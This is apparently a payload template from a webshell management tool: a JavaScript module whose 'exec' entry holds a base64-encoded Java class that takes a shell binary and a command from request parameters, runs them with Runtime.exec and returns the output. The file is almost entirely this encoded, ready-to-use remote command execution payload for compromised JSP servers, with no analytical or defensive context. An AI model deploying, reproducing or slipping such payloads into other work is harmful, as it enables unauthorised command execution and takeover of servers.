//
// 命令执行模板
//

module.exports = () => ({
  exec: {
    _: 'yv66vgAAADIA7goATABrBwBsCgACAG0KAAIAbggAbwsAcABxCAByCABzCAB0BwB1CgAKAHYIAHcLAHgAeQsAcAB6CwB4AHoHAHsKABAAawgAfAoAEAB9CgAQAH4KAEsAfwoASwCACACBCACCCgAKAIMKAEsAhAoACgB+CACFCgACAIYKAIcAiAcAiQgAigoAHwB+CACLCgAkAIwHAI0KACQAjgoAJACPCACQCACRCgAkAJIHAJMKACQAlAoAKgCVCgAkAJYKACQAlwoAEACYCACZCgAqAJoKACoAmwgAnAcAnQoANABrCgA0AJ4KAEsAnwgAoAgAoQoAogCjCgCiAKQKAKUApgoASwCnCgClAKgIAKkKAKoAqwoAJACsCACtCgAkAK4HAK8HALAKAEUAsQoARACyCgBEALMIALQKAEQAtQcAYQcAtgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAA1TdGFja01hcFRhYmxlBwBsBwC3BwC4BwCNBwBhBwC2BwB1BwCJAQACRUMBAEooTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACkV4Y2VwdGlvbnMBAAZkZWNvZGUHAJMBABJFeGVjdXRlQ29tbWFuZENvZGUHALkBAAVpc1dpbgEAAygpWgEAD0NvcHlJbnB1dFN0cmVhbQEAQihMamF2YS9pby9JbnB1dFN0cmVhbTtMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjtMamF2YS9sYW5nL1N0cmluZzspVgcArwcAugEAClNvdXJjZUZpbGUBABdFeGVjdXRlQ29tbWFuZENvZGUuamF2YQwATQBOAQAdamF2YXgvc2VydmxldC9qc3AvUGFnZUNvbnRleHQMALsAvAwAvQC+AQAHZW5jb2RlcgcAtwwAvwDAAQAAAQAHY2hhcnNldAEABVVURi04AQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwATQDBAQAJdGV4dC9odG1sBwC4DADCAMEMAMMAwQEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAEdmFyMQwAxADFDADGAMcMAF8AXQwAXABdAQAEdmFyMgEAAy0+fAwAxADIDABhAF0BAAN8PC0MAMkAygcAywwAzADBAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEACUVSUk9SOi8vIAEAA2hleAwAUQBSAQAQamF2YS9sYW5nL1N0cmluZwwAzQDODABNAM8BAARudWxsAQAQMDEyMzQ1Njc4OUFCQ0RFRgwA0ADHAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0MANEA0gwATQDTDADUANUMANYA1wwAxADYAQABLAwA2QDTDADGAMABAAZiYXNlNjQBABZzdW4vbWlzYy9CQVNFNjREZWNvZGVyDADaANsMAGMAZAEAAi1jAQACL2MHANwMAN0A3gwA3wDgBwDhDADiAOMMAGUAZgwA5ADjAQAHb3MubmFtZQcA5QwA5gDADADnAMcBAAN3aW4MAOgA6QEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDABNAOoMAE0A6wwA7ADHAQACDQoMAO0ATgEAEGphdmEvbGFuZy9PYmplY3QBABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABNbTGphdmEvbGFuZy9TdHJpbmc7AQATamF2YS9pby9JbnB1dFN0cmVhbQEACmdldFJlcXVlc3QBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAC2dldFJlc3BvbnNlAQAhKClMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA5zZXRDb250ZW50VHlwZQEAFHNldENoYXJhY3RlckVuY29kaW5nAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEALChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7AQAGZ2V0T3V0AQAfKClMamF2YXgvc2VydmxldC9qc3AvSnNwV3JpdGVyOwEAG2phdmF4L3NlcnZsZXQvanNwL0pzcFdyaXRlcgEABXByaW50AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAAt0b1VwcGVyQ2FzZQEABmxlbmd0aAEAAygpSQEABChJKVYBAAZjaGFyQXQBAAQoSSlDAQAHaW5kZXhPZgEABChJKUkBABwoSSlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAFd3JpdGUBAAxkZWNvZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBAA5nZXRFcnJvclN0cmVhbQEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAKc3RhcnRzV2l0aAEAFShMamF2YS9sYW5nL1N0cmluZzspWgEAKihMamF2YS9pby9JbnB1dFN0cmVhbTtMamF2YS9sYW5nL1N0cmluZzspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEABWNsb3NlACEASwBMAAAAAAAHAAEATQBOAAEATwAAAB0AAQABAAAABSq3AAGxAAAAAQBQAAAABgABAAAACQABAFEAUgABAE8AAAHfAAUACwAAAScrwAACTSy2AANOLLYABDoELRIFuQAGAgDGAA4tEgW5AAYCAKcABRIHOgUtEgi5AAYCAMYADi0SCLkABgIApwAFEgk6BrsAClkSB7cACzoHuwAKWRIHtwALOggZBBIMuQANAgAtGQa5AA4CABkEGQa5AA8CACoquwAQWbcAES0SErkABgIAtgATEge2ABO2ABQZBRkGtgAVGQUZBrYAFjoJKiq7ABBZtwARLRIXuQAGAgC2ABMSB7YAE7YAFBkFGQa2ABUZBRkGtgAWOgoZBxIYtgAZVxkIKhkJGQoZBrYAGrYAGVcZBxkItgAbtgAZVxkHEhy2ABlXLLYAHRkHtgAbtgAepwAiOgkZCLsAEFm3ABESILYAExkJtgAhtgATtgAUtgAZVwSsAAEAWgEDAQYAHwACAFAAAABWABUAAAAMAAUADQAKAA4AEAAPACoAEABEABEATwASAFoAFABjABUAawAWAHQAFwCgABgAzAAZANQAGgDkABsA7wAcAPcAHQEDACABBgAeAQgAHwElACEAUwAAAEIABv4AJgcAVAcAVQcAVkEHAFf8ABcHAFdBBwBX/wDDAAkHAFgHAFkHAFQHAFUHAFYHAFcHAFcHAFoHAFoAAQcAWx4AAABcAF0AAgBPAAAARAAEAAQAAAAeLBIitgAjmgAJLBIipgAFK7C7ACRZK7YAJS23ACawAAAAAgBQAAAACgACAAAAJAARACUAUwAAAAQAAg8BAF4AAAAEAAEAHwAAAF8AXQACAE8AAAFoAAYACAAAANwsEiK2ACOaAAksEiKmAJ8rEielAAwrEie2ACOZAAYSB7ASKDoEK7YAKUy7ACpZK7YAKwVstwAsOgUSBzoGAzYHFQcrtgArogBduwAQWbcAERkGtgATGQQrFQe2AC22AC4HeBkEKxUHBGC2AC22AC6AtgAvEjC2ABO2ABQ6BhkFGQQrFQe2AC22AC4HeBkEKxUHBGC2AC22AC6AtgAxhAcCp/+gGQUSCbYAMrAsEjO2ACOaAAksEjOmACMBOgS7ADRZtwA1OgUZBSu2ADY6BLsAJFkZBBIJtwAmsCuwAAAAAgBQAAAASgASAAAAKAAPACkAHgAqACEALAAlAC0AKgAuADkALwA9ADAASQAxAH0AMgCdADAAowA0AKsANQC6ADYAvQA3AMYAOADOADkA2gA7AFMAAAAqAAgPDgL/AB4ACAcAWAcAVwcAVwcAVwcAVwcAYAcAVwEAAPoAYvgABw4fAF4AAAAEAAEAHwAAAGEAXQACAE8AAADDAAQABwAAAFK7AApZEge3AAs6BAa9ACRZAytTWQQqtgA3mgAIEjinAAUSOVNZBSxTOgW4ADoZBbYAOzoGKhkGtgA8GQQttgA9KhkGtgA+GQQttgA9GQS2ABuwAAAAAgBQAAAAGgAGAAAAPgALAD8AKgBAADQAQQBAAEIATABDAFMAAAA/AAL/ACEABQcAWAcAVwcAVwcAVwcAWgADBwBiBwBiAf8AAQAFBwBYBwBXBwBXBwBXBwBaAAQHAGIHAGIBBwBXAF4AAAAEAAEAHwAAAGMAZAABAE8AAABOAAIAAgAAABgSP7gAQEwrtgBBTCsSQrYAQ5kABQSsA6wAAAACAFAAAAAWAAUAAABGAAYARwALAEgAFABJABYASgBTAAAACAAB/AAWBwBXAAAAZQBmAAIATwAAAI8ABgAGAAAAP7sARFm7AEVZKy23AEa3AEc6BRkFtgBIWToExgAfLLsAEFm3ABEZBLYAExJJtgATtgAUtgAZV6f/3BkFtgBKsQAAAAIAUAAAABYABQAAAE4AEgBPAB0AUAA5AFIAPgBTAFMAAAAiAAL9ABIABwBn/wAmAAYHAFgHAGgHAFoHAFcHAFcHAGcAAABeAAAABAABAB8AAQBpAAAAAgBq',
    'var1': '#{bin}',
    'var2': '#{cmd}',
  },
  listcmd: {
    _: 'Y',
    'z1': '#{binarr}'
  }
})